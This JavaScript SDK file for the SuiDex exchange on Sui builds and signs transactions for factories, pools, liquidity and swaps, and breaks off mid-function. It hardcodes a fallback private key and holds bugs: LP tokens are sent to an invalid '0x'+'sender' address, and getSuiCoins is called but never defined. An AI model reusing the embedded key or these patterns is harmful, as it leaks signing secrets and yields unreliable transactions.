// interaction.js - SuiDex SDK for frontend integration
const { SuiClient } = require('@mysten/sui.js/client');
const { TransactionBlock } = require('@mysten/sui.js/transactions');
const { Ed25519Keypair } = require('@mysten/sui.js/keypairs/ed25519');
const { fromB64 } = require('@mysten/sui.js/utils');
const { decodeSuiPrivateKey } = require('@mysten/sui.js/cryptography');

// Package ID from publishing the contract
const DEFAULT_PACKAGE_ID = '0xc65e705ddf9438293b11072db983ce1aa77f36ae80cd1f9f888653851500ee1a';

// Constants
const MODULE_FACTORY = 'factory';
const MODULE_POOL = 'pool';
const MODULE_ROUTER = 'router';
const GAS_BUDGET = 10000000;

// For testing - private key can be provided as environment variable for security
// Never hardcode private keys in your production code
const PRIVATE_KEY = process.env.SUI_PRIVATE_KEY || 'suiprivkey1qr8yacxzuu66a7f2j0hsr0xew9jk3ylvcp4mjms3us88uw7u2k8dg835jz4';

/**
 * Initialize Sui client with the specified network or URL
 * @param {string} network - The network to connect to ('devnet', 'testnet', 'mainnet')
 * @param {string} customUrl - Custom RPC URL (optional)
 * @returns {SuiClient} The initialized Sui client
 */
function initClient(network = 'testnet', customUrl = null) {
    if (customUrl) {
        return new SuiClient({ url: customUrl });
    }

    const networkUrls = {
        //devnet: 'https://fullnode.devnet.sui.io:443',
        testnet: 'https://fullnode.testnet.sui.io:443',
        // mainnet: 'https://sui-mainnet.mystenlabs.com/json-rpc'
    };

    return new SuiClient({ url: networkUrls[network] || networkUrls.testnet });
}

/**
 * Create a factory transaction
 * @param {string} packageId - The package ID of the SuiDex contract
 * @returns {TransactionBlock} The transaction block
 */
function createFactoryTx(packageId = DEFAULT_PACKAGE_ID) {
    const tx = new TransactionBlock();
    
    tx.moveCall({
        target: `${packageId}::${MODULE_FACTORY}::create_factory`,
        arguments: [],
    });

    return tx;
}

/**
 * Create a factory
 * @param {SuiClient} client - The Sui client
 * @param {Ed25519Keypair} keypair - The keypair for signing
 * @param {string} packageId - The package ID of the SuiDex contract
 * @returns {Promise<Object>} Transaction result
 */
async function createFactory(client, keypair, packageId = DEFAULT_PACKAGE_ID) {
    const tx = createFactoryTx(packageId);
    tx.setGasBudget(GAS_BUDGET);
    const result = await client.signAndExecuteTransactionBlock({ 
        signer: keypair,
        transactionBlock: tx,
        options: { showEffects: true, showObjectChanges: true }
    });
    return result;
}

/**
 * Create a pool transaction
 * @param {string} packageId - The package ID of the SuiDex contract
 * @param {string} factoryId - The factory object ID
 * @param {string} coinTypeA - First coin type
 * @param {string} coinTypeB - Second coin type
 * @returns {TransactionBlock} The transaction block
 */
function createPoolTx(packageId = DEFAULT_PACKAGE_ID, factoryId, coinTypeA, coinTypeB) {
    try {
        const tx = new TransactionBlock();
        
        // Validate type arguments to catch common errors
        if (!coinTypeA.includes('::') || !coinTypeB.includes('::')) {
            console.warn('Type arguments should be fully qualified (e.g., "0x2::sui::SUI")');
        }
        
        // Log the exact types being used for debugging
        console.log('Creating pool with type arguments:');
        console.log('- Coin A:', coinTypeA);
        console.log('- Coin B:', coinTypeB);
        
        tx.moveCall({
            target: `${packageId}::${MODULE_FACTORY}::create_pool`,
            typeArguments: [coinTypeA, coinTypeB],
            arguments: [tx.object(factoryId)],
        });
        
        return tx;
    } catch (error) {
        console.error('Error creating pool transaction:', error);
        throw error;
    }
}

/**
 * Create a new trading pool
 * @param {SuiClient} client - The Sui client
 * @param {Ed25519Keypair} keypair - The keypair for signing
 * @param {string} factoryId - The factory object ID
 * @param {string} coinTypeA - First coin type
 * @param {string} coinTypeB - Second coin type
 * @param {string} packageId - The package ID of the SuiDex contract
 * @returns {Promise<Object>} Transaction result
 */
async function createPool(client, keypair, factoryId, coinTypeA, coinTypeB, packageId = DEFAULT_PACKAGE_ID) {
    try {
        const tx = createPoolTx(packageId, factoryId, coinTypeA, coinTypeB);
        tx.setGasBudget(GAS_BUDGET);
        
        try {
            const result = await client.signAndExecuteTransactionBlock({
                signer: keypair,
                transactionBlock: tx,
                options: { showEffects: true, showObjectChanges: true }
            });
            return result;
        } catch (error) {
            if (error.message && error.message.includes('TypeArityMismatch')) {
                console.error('\nTypeArityMismatch ERROR: The number of type arguments does not match the function signature.');
                console.error('Check if your coin types are correctly specified with all required type parameters.');
                console.error('Example: If LP token is generic (LP<T>), use "package::module::LP<0x2::sui::SUI>" not just "package::module::LP"\n');
            }
            throw error;
        }
    } catch (error) {
        console.error('Error in createPool:', error);
        throw error;
    }
}

/**
 * Get factory object details
 * @param {SuiClient} client - The Sui client
 * @param {string} factoryId - The factory object ID
 * @returns {Promise<Object>} Factory object details
 */
async function getFactory(client, factoryId) {
    const factory = await client.getObject({
        id: factoryId,
        options: { showContent: true }
    });
    return factory;
}

/**
 * Create an add liquidity transaction
 * @param {string} packageId - The package ID of the SuiDex contract
 * @param {string} factoryId - The factory object ID
 * @param {string} poolId - The pool object ID
 * @param {string} coinTypeA - First coin type
 * @param {string} coinTypeB - Second coin type
 * @param {string} coinAObjectId - Coin A object ID
 * @param {string} coinBObjectId - Coin B object ID
 * @param {string|number} amountAMin - Minimum amount of coin A
 * @param {string|number} amountBMin - Minimum amount of coin B
 * @param {string|number} deadline - Transaction deadline timestamp
 * @returns {TransactionBlock} The transaction block
 */
function addLiquidityTx(
    packageId = DEFAULT_PACKAGE_ID,
    factoryId,
    poolId,
        coinTypeA,
        coinTypeB,
    coinAObjectId,
    coinBObjectId,
        amountAMin,
        amountBMin,
        deadline
    ) {
    try {
        const tx = new TransactionBlock();
        
        // Log the transaction details for debugging
        console.log('Creating add liquidity transaction with:');
        console.log('- Coin A Type:', coinTypeA);
        console.log('- Coin B Type:', coinTypeB);
        console.log('- Factory ID:', factoryId);
        console.log('- Pool ID:', poolId);
        console.log('- Coin A ID:', coinAObjectId);
        console.log('- Coin B ID:', coinBObjectId);
        console.log('- Amount A Min:', amountAMin);
        console.log('- Amount B Min:', amountBMin);
        console.log('- Deadline:', deadline);
        
        // Add liquidity using router::add_liquidity
        // Matches the function signature in router.move:
        // public fun add_liquidity<CoinTypeA, CoinTypeB>(
        //   factory: &DexFactory,
        //   pool: &mut Pool<CoinTypeA, CoinTypeB>,
        //   coin_a: Coin<CoinTypeA>,
        //   coin_b: Coin<CoinTypeB>,
        //   amount_a_min: u64,
        //   amount_b_min: u64,
        //   deadline: u64,
        //   ctx: &mut TxContext
        // ): LP<CoinTypeA, CoinTypeB>
        
        const lpCoin = tx.moveCall({
            target: `${packageId}::${MODULE_ROUTER}::add_liquidity`,
            typeArguments: [coinTypeA, coinTypeB],
            arguments: [
                tx.object(factoryId),  // factory: &DexFactory
                tx.object(poolId),     // pool: &mut Pool<CoinTypeA, CoinTypeB>
                tx.object(coinAObjectId), // coin_a: Coin<CoinTypeA>
                tx.object(coinBObjectId), // coin_b: Coin<CoinTypeB>
                tx.pure(amountAMin),   // amount_a_min: u64
                tx.pure(amountBMin),   // amount_b_min: u64
                tx.pure(deadline),     // deadline: u64
            ],
        });

        // The function returns LP tokens that we need to transfer to the sender
        // This happens automatically in entry functions, but we include it for completeness
        tx.transferObjects([lpCoin], tx.pure('0x' + 'sender'));
        
        return tx;
    } catch (error) {
        console.error('Error creating add liquidity transaction:', error);
        throw error;
    }
}

/**
 * Add liquidity to a pool
 * @param {SuiClient} client - The Sui client
 * @param {Ed25519Keypair} keypair - The keypair for signing
 * @param {string} factoryId - The factory object ID
 * @param {string} poolId - The pool object ID
 * @param {string} coinTypeA - First coin type
 * @param {string} coinTypeB - Second coin type
 * @param {string} coinAObjectId - Coin A object ID
 * @param {string} coinBObjectId - Coin B object ID
 * @param {string|number} amountAMin - Minimum amount of coin A
 * @param {string|number} amountBMin - Minimum amount of coin B
 * @param {string|number} deadline - Transaction deadline timestamp
 * @param {string} packageId - The package ID of the SuiDex contract
 * @returns {Promise<Object>} Transaction result with LP token information
 */
async function addLiquidity(
    client,
    keypair,
    factoryId,
    poolId,
    coinTypeA,
    coinTypeB,
    coinAObjectId,
    coinBObjectId,
    amountAMin,
    amountBMin,
    deadline,
    packageId = DEFAULT_PACKAGE_ID
) {
    try {
        // Create the transaction
        const tx = addLiquidityTx(
            packageId,
            factoryId,
            poolId,
            coinTypeA,
            coinTypeB,
            coinAObjectId,
            coinBObjectId,
            amountAMin,
            amountBMin,
            deadline
        );
        
        // Set gas budget explicitly
        tx.setGasBudget(GAS_BUDGET);
        
        // Important: Since we're using the SUI coin for both transaction input and gas payment,
        // we need to make sure we're not using the same coin for both
        // Get additional SUI coins for gas
        const coins = await client.getCoins({
            owner: keypair.getPublicKey().toSuiAddress(),
            coinType: '0x2::sui::SUI'
        });
        
        if (coins.data && coins.data.length > 0) {
            // Find a different coin to use for gas (not the one we're using for liquidity)
            const gasCoin = coins.data.find(coin => 
                coin.coinObjectId !== coinAObjectId && 
                coin.balance > GAS_BUDGET
            );
            
            if (gasCoin) {
                console.log(`Using separate coin for gas payment: ${gasCoin.coinObjectId}`);
                tx.setGasPayment([tx.object(gasCoin.coinObjectId)]);
            } else if (coins.data.length > 1) {
                // If no single coin has enough balance, try to use multiple coins
                console.log('Using multiple coins for gas payment');
                const gasCoins = coins.data
                    .filter(coin => coin.coinObjectId !== coinAObjectId)
                    .map(coin => tx.object(coin.coinObjectId));
                
                if (gasCoins.length > 0) {
                    tx.setGasPayment(gasCoins);
                }
            }
        }
        
        // Execute the transaction
        console.log('Executing add liquidity transaction...');
            const result = await client.signAndExecuteTransactionBlock({
            signer: keypair,
                transactionBlock: tx,
            options: { 
                showEffects: true, 
                showObjectChanges: true,
                showEvents: true  // Include events to see LP token minting events
            }
        });
        
        console.log('Add liquidity transaction executed, digest:', result.digest);
        
        // Extract LP token information from the result
        let lpTokenId = null;
        if (result.objectChanges) {
            // Look for created objects of LP token type
            const lpTokenObj = result.objectChanges.find(
                change => change.type === 'created' && 
                          change.objectType && 
                          change.objectType.includes('lp_token::LP')
            );
            
            if (lpTokenObj) {
                lpTokenId = lpTokenObj.objectId;
                console.log('LP token created with ID:', lpTokenId);
            }
        }
        
        return {
            ...result,
            lpTokenId
        };
        } catch (error) {
            console.error('Error adding liquidity:', error);
        if (error.message) {
            if (error.message.includes('deadline')) {
                console.error('Deadline exceeded. Use a later deadline timestamp.');
            } else if (error.message.includes('EPoolNotFound')) {
                console.error('Pool not found in the factory.');
            } else if (error.message.includes('No valid gas coins')) {
                console.error('No valid gas coins found. Make sure you have multiple SUI coins available.');
                console.error('When using a SUI coin for the transaction, you need a separate SUI coin for gas.');
            }
        }
        throw error;
    }
}

/**
 * Swap exact input transaction
 * @param {string} packageId - The package ID of the SuiDex contract
 * @param {string} factoryId - The factory object ID
 * @param {string} poolId - The pool object ID
 * @param {string} coinTypeA - Input coin type
 * @param {string} coinTypeB - Output coin type
 * @param {string} coinInObjectId - Input coin object ID
 * @param {string|number} amountOutMin - Minimum output amount
 * @param {string|number} deadline - Transaction deadline timestamp
 * @returns {TransactionBlock} The transaction block
 */
function swapExactInputTx(
    packageId = DEFAULT_PACKAGE_ID,
    factoryId,
    poolId,
        coinTypeA,
        coinTypeB,
    coinInObjectId,
        amountOutMin,
        deadline
    ) {
        const tx = new TransactionBlock();
        
    const coinIn = tx.object(coinInObjectId);

        tx.moveCall({
        target: `${packageId}::${MODULE_ROUTER}::swap_exact_input`,
            typeArguments: [coinTypeA, coinTypeB],
            arguments: [
            tx.object(factoryId),
                tx.object(poolId),
                coinIn,
                tx.pure(amountOutMin),
                tx.pure(deadline),
            ],
        });

    return tx;
}

/**
 * Swap exact input for output
 * @param {SuiClient} client - The Sui client
 * @param {Ed25519Keypair} keypair - The keypair for signing
 * @param {string} factoryId - The factory object ID
 * @param {string} poolId - The pool object ID
 * @param {string} coinTypeA - Input coin type
 * @param {string} coinTypeB - Output coin type
 * @param {string} coinInObjectId - Input coin object ID
 * @param {string|number} amountOutMin - Minimum output amount
 * @param {string|number} deadline - Transaction deadline timestamp
 * @param {string} packageId - The package ID of the SuiDex contract
 * @returns {Promise<Object>} Transaction result
 */
async function swapExactInput(
    client,
    keypair,
    factoryId,
    poolId,
    coinTypeA,
    coinTypeB,
    coinInObjectId,
    amountOutMin,
    deadline,
    packageId = DEFAULT_PACKAGE_ID
) {
    const tx = swapExactInputTx(
        packageId,
        factoryId,
        poolId,
        coinTypeA,
        coinTypeB,
        coinInObjectId,
        amountOutMin,
        deadline
    );

        tx.setGasBudget(GAS_BUDGET);
    const result = await client.signAndExecuteTransactionBlock({ 
        signer: keypair,
        transactionBlock: tx,
        options: { showEffects: true, showObjectChanges: true }
    });
    return result;
}

/**
 * Check if a pool exists (read-only function)
 * @param {SuiClient} client - The Sui client
 * @param {string} packageId - The package ID of the SuiDex contract
 * @param {string} factoryId - The factory object ID
 * @param {string} coinTypeA - First coin type
 * @param {string} coinTypeB - Second coin type
 * @param {string} sender - The sender address
 * @returns {Promise<boolean>} Whether the pool exists
 */
async function poolExists(client, packageId, factoryId, coinTypeA, coinTypeB, sender) {
    try {
        console.log('Checking if pool exists for type arguments:');
        console.log('- Coin A:', coinTypeA);
        console.log('- Coin B:', coinTypeB);
        
        const tx = new TransactionBlock();
        
        tx.moveCall({
            target: `${packageId}::${MODULE_FACTORY}::pool_exists`,
            typeArguments: [coinTypeA, coinTypeB],
            arguments: [tx.object(factoryId)],
        });
        
        try {
            const result = await client.devInspectTransactionBlock({
                sender,
                transactionBlock: tx,
            });
            
            if (result.effects?.status?.status === 'success' && result.results?.[0]?.returnValues) {
                const exists = Boolean(result.results[0].returnValues[0][0]);
                return exists;
            }
            return false;
        } catch (error) {
            if (error.message && error.message.includes('TypeArityMismatch')) {
                console.error('\nTypeArityMismatch ERROR in poolExists: The number of type arguments does not match the function signature.');
                console.error('Check if your coin types are correctly specified with all required type parameters.\n');
            }
            console.error('Error checking pool existence:', error);
            return false;
        }
    } catch (error) {
        console.error('Error in poolExists:', error);
        return false;
    }
}

/**
 * Get the pool address for a token pair (read-only function)
 * @param {SuiClient} client - The Sui client
 * @param {string} packageId - The package ID of the SuiDex contract
 * @param {string} factoryId - The factory object ID
 * @param {string} coinTypeA - First coin type
 * @param {string} coinTypeB - Second coin type
 * @param {string} sender - The sender address
 * @returns {Promise<string|null>} The pool address or null if not found
 */
async function getPoolAddress(client, packageId, factoryId, coinTypeA, coinTypeB, sender) {
    try {
        console.log('Getting pool address for type arguments:');
        console.log('- Coin A:', coinTypeA);
        console.log('- Coin B:', coinTypeB);
        
        const tx = new TransactionBlock();
        
        tx.moveCall({
            target: `${packageId}::${MODULE_FACTORY}::get_pool`,
            typeArguments: [coinTypeA, coinTypeB],
            arguments: [tx.object(factoryId)],
        });
        
        try {
            const result = await client.devInspectTransactionBlock({
                sender,
                transactionBlock: tx,
            });
            
            if (result.effects?.status?.status === 'success' && result.results?.[0]?.returnValues) {
                const exists = Boolean(result.results[0].returnValues[0][0]);
                if (exists) {
                    return result.results[0].returnValues[0][1];
                }
            }
            return null;
        } catch (error) {
            if (error.message && error.message.includes('TypeArityMismatch')) {
                console.error('\nTypeArityMismatch ERROR in getPoolAddress: The number of type arguments does not match the function signature.');
                console.error('Check if your coin types are correctly specified with all required type parameters.\n');
            }
            console.error('Error getting pool address:', error);
            return null;
        }
    } catch (error) {
        console.error('Error in getPoolAddress:', error);
        return null;
    }
}

/**
 * Extract shared object ID from transaction result
 * @param {Object} result - Transaction result
 * @returns {string|null} Shared object ID or null if not found
 */
function extractSharedObjectId(result) {
    try {
        // Check objectChanges first (more structured)
        if (result.objectChanges) {
            // Look for created objects with Shared owner
            const createdObjects = result.objectChanges.filter(
                change => change.type === 'created' && change.owner && change.owner.Shared
            );
            
            if (createdObjects.length > 0) {
                return createdObjects[0].objectId;
            }
        }
        
        // Fallback to effects.created
        if (result.effects && result.effects.created) {
            const sharedObjects = result.effects.created.filter(
                item => item.owner && item.owner.Shared
            );
            
            if (sharedObjects.length > 0) {
                return sharedObjects[0].reference.objectId;
            }
        }
        
        console.error('No shared object found in the transaction result');
        return null;
    } catch (error) {
        console.error('Error extracting shared object ID:', error);
        return null;
    }
}

/**
 * Create a keypair from a Sui private key or Base64 encoded private key
 * @param {string} privateKeyStr - The private key string (Sui format or Base64)
 * @returns {Ed25519Keypair} The keypair
 */
function createKeypairFromPrivateKey(privateKeyStr) {
    try {
        // Use Sui's official utility to decode the private key
        const { schema, secretKey } = decodeSuiPrivateKey(privateKeyStr);
        if (schema === 'ED25519') {
            return Ed25519Keypair.fromSecretKey(secretKey);
        }
        throw new Error(`Unsupported schema: ${schema}`);
    } catch (error) {
        console.error('Error creating keypair:', error);
        throw new Error('Invalid private key format');
    }
}

/**
 * Test creation of a factory using a private key
 * This function shows how to call contract functions with an actual keypair
 * @param {string} privateKeyStr - The private key string
 * @returns {Promise<string>} The factory ID created
 */
async function testCreateFactory(privateKeyStr) {
    try {
        // Create a keypair from the private key
        const keypair = createKeypairFromPrivateKey(privateKeyStr);
        console.log('Using address:', keypair.getPublicKey().toSuiAddress());
        
        // Create a client
        const client = initClient('devnet');
        
        console.log('Creating factory...');
        // Create a factory
        const result = await createFactory(client, keypair, DEFAULT_PACKAGE_ID);
        console.log('Transaction executed, digest:', result.digest);
        
        // Extract the factory ID
        let factoryId = extractSharedObjectId(result);
        
        // If extraction failed, try to manually find the DexFactory in objectChanges
        if (!factoryId && result.objectChanges) {
            const factoryObject = result.objectChanges.find(
                change => change.objectType && change.objectType.includes('factory::DexFactory')
            );
            if (factoryObject) {
                factoryId = factoryObject.objectId;
            }
        }
        
        if (factoryId) {
            console.log('Factory created successfully!');
            console.log('Factory ID:', factoryId);
            return factoryId;
        } else {
            console.error('Factory creation successful, but could not extract factory ID');
            // Show the factory type from the transaction for debugging
            const factoryTypes = result.objectChanges
                .filter(change => change.type === 'created')
                .map(change => `${change.objectType} (${change.objectId})`);
            console.log('Created objects:', factoryTypes.join(', '));
            
            // Return the first created object as a fallback
            if (result.objectChanges && result.objectChanges.some(change => change.type === 'created')) {
                const firstCreated = result.objectChanges.find(change => change.type === 'created');
                console.log('Using first created object as factory ID:', firstCreated.objectId);
                return firstCreated.objectId;
            }
            return null;
        }
    } catch (error) {
        console.error('Error in testCreateFactory:', error);
        throw error;
    }
}

/**
 * Test creation of a pool using a private key
 * @param {string} privateKeyStr - The private key string
 * @param {string} factoryId - The factory ID
 * @param {string} coinTypeA - First coin type (e.g., '0x2::sui::SUI')
 * @param {string} coinTypeB - Second coin type
 * @returns {Promise<string>} The pool ID created
 */
async function testCreatePool(privateKeyStr, factoryId, coinTypeA, coinTypeB) {
    try {
        // Create a keypair from the private key
        const keypair = createKeypairFromPrivateKey(privateKeyStr);
        console.log('Using address:', keypair.getPublicKey().toSuiAddress());
        
        // Create a client
        const client = initClient('devnet');
        
        console.log(`Creating pool for ${coinTypeA} and ${coinTypeB}...`);
        
        // Debug: Check if pool already exists first
        const senderAddress = keypair.getPublicKey().toSuiAddress();
        const existsBefore = await poolExists(client, DEFAULT_PACKAGE_ID, factoryId, coinTypeA, coinTypeB, senderAddress);
        console.log(`Pool exists before creation attempt: ${existsBefore}`);
        
        // Create a pool
        const result = await createPool(client, keypair, factoryId, coinTypeA, coinTypeB);
        console.log('Transaction executed, digest:', result.digest);
        
        // Debug transaction status
        if (result.effects && result.effects.status) {
            console.log(`Transaction status: ${result.effects.status.status}`);
            if (result.effects.status.status === 'failure' && result.effects.status.error) {
                console.error('Transaction error:', result.effects.status.error);
            }
        }
        
        // Extract the pool ID by checking for created objects
        let poolId = null;
        
        // First, try to find any object with 'pool' in its type
        if (result.objectChanges) {
            // Look for specific pool types in the package
            const poolTypePatterns = [
                `${DEFAULT_PACKAGE_ID}::pool::Pool`,
                `${DEFAULT_PACKAGE_ID}::pool::PoolCreated`,
                '::pool::',  // More general pattern
                'Pool'       // Very general fallback
            ];
            
            // Try each pattern in order, from most specific to least
            for (const pattern of poolTypePatterns) {
                if (poolId) break; // Stop if we found the pool
                
                // Find a created object matching the pattern
                const poolObject = result.objectChanges.find(
                    change => change.type === 'created' && 
                              change.objectType && 
                              change.objectType.includes(pattern)
                );
                
                if (poolObject) {
                    poolId = poolObject.objectId;
                    console.log(`Found pool with type ${poolObject.objectType}`);
                }
            }
        }
        
        // If still not found, try the effects.created array
        if (!poolId && result.effects && result.effects.created && result.effects.created.length > 0) {
            // Just take the first created object as a fallback
            poolId = result.effects.created[0].reference.objectId;
            console.log('Using first created object as fallback pool ID');
        }
        
        // Debug: Check if pool exists after the creation attempt
        const existsAfter = await poolExists(client, DEFAULT_PACKAGE_ID, factoryId, coinTypeA, coinTypeB, senderAddress);
        console.log(`Pool exists after creation attempt: ${existsAfter}`);
        
        // If pool exists but we couldn't find the ID from transaction, try getting it directly
        if (existsAfter && !poolId) {
            const poolAddr = await getPoolAddress(client, DEFAULT_PACKAGE_ID, factoryId, coinTypeA, coinTypeB, senderAddress);
            if (poolAddr) {
                console.log('Successfully found pool ID via factory lookup:', poolAddr);
                poolId = poolAddr;
            }
        }
        
        if (poolId) {
            console.log('Pool created successfully!');
            console.log('Pool ID:', poolId);
            return poolId;
        } else {
            console.error('Pool creation completed, but could not find pool ID in results');
            
            // Dump all created object types for debugging
            if (result.objectChanges) {
                const createdObjects = result.objectChanges
                    .filter(change => change.type === 'created')
                    .map(change => `- ${change.objectType} (${change.objectId})`)
                    .join('\n');
                
                if (createdObjects) {
                    console.log('Created objects in transaction:\n' + createdObjects);
                } else {
                    console.log('No objects were created in this transaction!');
                    
                    // Check for mutated objects - maybe pool is stored in the factory?
                    const mutatedObjects = result.objectChanges
                        .filter(change => change.type === 'mutated')
                        .map(change => `- ${change.objectType} (${change.objectId})`)
                        .join('\n');
                    
                    if (mutatedObjects) {
                        console.log('Objects mutated in transaction:\n' + mutatedObjects);
                        console.log('The pool might be stored in the factory instead of being a separate object');
                    }
                }
            }
            
            console.log('\nDEBUG: Transaction details');
            console.log('Digest:', result.digest);
            console.log('Status:', result.effects?.status?.status);
            
            if (result.effects?.events) {
                console.log('Events:', JSON.stringify(result.effects.events, null, 2));
            }
            
            return null;
        }
    } catch (error) {
        console.error('Error in testCreatePool:', error);
        throw error;
    }
}

/**
 * Check if a pool exists in the factory
 * @param {string} factoryId - The factory ID
 * @param {string} coinTypeA - First coin type
 * @param {string} coinTypeB - Second coin type
 * @param {string} senderAddress - The sender address for the view function
 * @returns {Promise<boolean>} Whether the pool exists
 */
async function testPoolExists(factoryId, coinTypeA, coinTypeB, senderAddress) {
    try {
        const client = initClient('devnet');
        
        console.log(`Checking if pool exists for ${coinTypeA} and ${coinTypeB}...`);
        const exists = await poolExists(client, DEFAULT_PACKAGE_ID, factoryId, coinTypeA, coinTypeB, senderAddress);
        
        console.log('Pool exists:', exists);
        return exists;
    } catch (error) {
        console.error('Error checking if pool exists:', error);
        throw error;
    }
}

/**
 * Analyze the smart contract to understand the expected types
 * @param {SuiClient} client - The Sui client
 * @param {string} address - The sender address
 * @param {string} packageId - The package ID
 * @returns {Promise<void>}
 */
async function analyzeContractTypes(client, address, packageId = DEFAULT_PACKAGE_ID) {
    try {
        console.log('\n=== Analyzing Contract Types ===');
        
        // Check module interface
        const tx = new TransactionBlock();
        
        // Try to query module interface by using a simplified call
        try {
            const moduleRes = await client.getNormalizedMoveModule({
                package: packageId,
                module: MODULE_FACTORY
            });
            
            console.log(`\nModule ${MODULE_FACTORY} structure:`);
            
            // Look for create_pool function
            if (moduleRes && moduleRes.exposedFunctions) {
                const createPoolFn = Object.values(moduleRes.exposedFunctions)
                    .find(fn => fn.name === 'create_pool');
                
                if (createPoolFn) {
                    console.log('\nFound create_pool function:');
                    console.log('- Visibility:', createPoolFn.visibility);
                    console.log('- Is Entry:', createPoolFn.isEntry);
                    console.log('- Type Parameters:', createPoolFn.typeParameters?.length || 0);
                    
                    if (createPoolFn.typeParameters && createPoolFn.typeParameters.length > 0) {
                        createPoolFn.typeParameters.forEach((param, i) => {
                            console.log(`  Param ${i+1}:`, JSON.stringify(param));
                        });
                    }
                    
                    console.log('- Parameters:', createPoolFn.parameters?.length || 0);
                    if (createPoolFn.parameters && createPoolFn.parameters.length > 0) {
                        createPoolFn.parameters.forEach((param, i) => {
                            console.log(`  Param ${i+1}:`, param);
                        });
                    }
                } else {
                    console.log('create_pool function not found');
                }
            }
            
            // Look for LP token definition
            try {
                const lpModuleRes = await client.getNormalizedMoveModule({
                    package: packageId,
                    module: 'lp_token'
                });
                
                if (lpModuleRes && lpModuleRes.structs) {
                    console.log('\nLP Token Definition:');
                    const lpStruct = Object.values(lpModuleRes.structs)
                        .find(struct => struct.name === 'LP');
                    
                    if (lpStruct) {
                        console.log('- Type Parameters:', lpStruct.typeParameters?.length || 0);
                        if (lpStruct.typeParameters && lpStruct.typeParameters.length > 0) {
                            lpStruct.typeParameters.forEach((param, i) => {
                                console.log(`  Param ${i+1}:`, JSON.stringify(param));
                            });
                        }
                        
                        console.log('- Fields:');
                        if (lpStruct.fields && lpStruct.fields.length > 0) {
                            lpStruct.fields.forEach(field => {
                                console.log(`  ${field.name}: ${field.type}`);
                            });
                        }
                    } else {
                        console.log('LP struct not found');
                    }
                }
            } catch (error) {
                console.log('LP token module not found or error querying it');
                console.log('Error:', error.message);
            }
            
        } catch (error) {
            console.error('Error analyzing contract:', error);
        }
        
        console.log('\n=== Contract Analysis Complete ===');
    } catch (error) {
        console.error('Error in analyzeContractTypes:', error);
    }
}

/**
 * Test adding liquidity to a pool
 * @param {string} privateKeyStr - The private key string
 * @param {string} factoryId - The factory ID
 * @param {string} poolId - The pool ID
 * @param {string} coinTypeA - First coin type (e.g., '0x2::sui::SUI')
 * @param {string} coinTypeB - Second coin type (e.g., '0x2::clock::Clock')
 * @param {string} coinAId - Coin A object ID - pass null to auto-select
 * @param {string} coinBId - Coin B object ID
 * @param {number} amountAMin - Minimum amount of coin A
 * @param {number} amountBMin - Minimum amount of coin B
 * @returns {Promise<string>} The LP token ID
 */
async function testAddLiquidity(
    privateKeyStr,
    factoryId,
    poolId,
    coinTypeA,
    coinTypeB,
    coinAId = null,
    coinBId,
    amountAMin = 1000,
    amountBMin = 1000
) {
    try {
        // Create a keypair from the private key
        const keypair = createKeypairFromPrivateKey(privateKeyStr);
        console.log('Using address:', keypair.getPublicKey().toSuiAddress());
        
        // Create a client
        const client = initClient('devnet');
        
        console.log(`Adding liquidity for ${coinTypeA} and ${coinTypeB}...`);
        
        // If SUI is being used and no specific coinAId was provided, find suitable coins
        if (coinTypeA === '0x2::sui::SUI' && !coinAId) {
            // Get all SUI coins
            const suiCoins = await getSuiCoins(client, keypair.getPublicKey().toSuiAddress());
            
            if (suiCoins.length === 0) {
                throw new Error('No SUI coins found in wallet');
            }
            
            // Sort coins by balance (descending)
            suiCoins.sort((a, b) => parseInt(b.balance) - parseInt(a.balance));
            
            // We'll implement a direct approach to add liquidity through JavaScript
            // This approach attempts to handle the gas coin issues
            
            // 1. First, let's make sure we have enough SUI coins
            if (suiCoins.length === 0) {
                throw new Error('No SUI coins found in wallet');
            }
            
            // Get the latest coins to ensure we have the most up-to-date information
            console.log('Refreshing coin data to ensure accuracy...');
            const refreshedCoins = await client.getCoins({
                owner: keypair.getPublicKey().toSuiAddress(),
                coinType: '0x2::sui::SUI'
            });
            
            if (!refreshedCoins || !refreshedCoins.data || refreshedCoins.data.length === 0) {
                throw new Error('No SUI coins found in wallet after refresh');
            }
            
            console.log(`Found ${refreshedCoins.data.length} SUI coins after refresh`);
            
            // Sort coins by balance (descending)
            refreshedCoins.data.sort((a, b) => parseInt(b.balance) - parseInt(a.balance));
            
            // Find a coin with sufficient balance
            let selectedCoin = null;
            for (const coin of refreshedCoins.data) {
                if (parseInt(coin.balance) >= amountAMin + GAS_BUDGET) {
                    selectedCoin = coin;
                    break;
                }
            }
            
            if (!selectedCoin) {
                throw new Error(`No coin with sufficient balance found. Need at least ${amountAMin + GAS_BUDGET} MIST`);
            }
            
            coinAId = selectedCoin.coinObjectId;
            console.log(`Selected SUI coin: ${coinAId} (balance: ${selectedCoin.balance})`);
            
            // 2. Set deadline to current epoch + 10
            const epochResponse = await client.getLatestSuiSystemState();
            const currentEpoch = parseInt(epochResponse.epoch);
            const deadline = currentEpoch + 10;
            console.log(`Current epoch: ${currentEpoch}, deadline: ${deadline}`);
            
            // 3. Create a new transaction specifically for adding liquidity
            console.log('\n=== Creating Direct Add Liquidity Transaction ===');
            
            try {
                // We need to take a different approach to handle the gas coin issue
                console.log('Using a two-step approach to handle gas coin constraints...');
                
                // Step 1: First create a transaction to split the coin
                const splitTx = new TransactionBlock();
                splitTx.setGasBudget(GAS_BUDGET);
                
                // Split the coin into two parts: one for liquidity and one for future gas
                const [remainingCoin, splitCoin] = splitTx.splitCoins(
                    splitTx.object(coinAId),
                    [splitTx.pure(amountAMin)]
                );
                
                // Transfer the split coin to ourselves so we can reference it in the next transaction
                splitTx.transferObjects([splitCoin], splitTx.pure(keypair.getPublicKey().toSuiAddress()));
                
                console.log('Executing coin split transaction...');
                const splitResult = await client.signAndExecuteTransactionBlock({
                    signer: keypair,
                    transactionBlock: splitTx,
                    options: { showEffects: true, showObjectChanges: true }
                });
                
                console.log('Split transaction executed, digest:', splitResult.digest);
                
                // Find the newly created coin in the transaction result
                let newCoinId = null;
                if (splitResult.objectChanges) {
                    const newCoin = splitResult.objectChanges.find(
                        change => change.type === 'created' && 
                                change.objectType === '0x2::coin::Coin<0x2::sui::SUI>'
                    );
                    
                    if (newCoin) {
                        newCoinId = newCoin.objectId;
                        console.log(`Found newly created coin: ${newCoinId}`);
                    } else {
                        console.error('Failed to find the split coin in transaction result');
                        throw new Error('Could not find the split coin in the transaction result');
                    }
                } else {
                    console.error('Transaction completed but no object changes found');
                    throw new Error('Could not find object changes in the transaction result');
                }
                
                // Wait a moment for the transaction to be confirmed
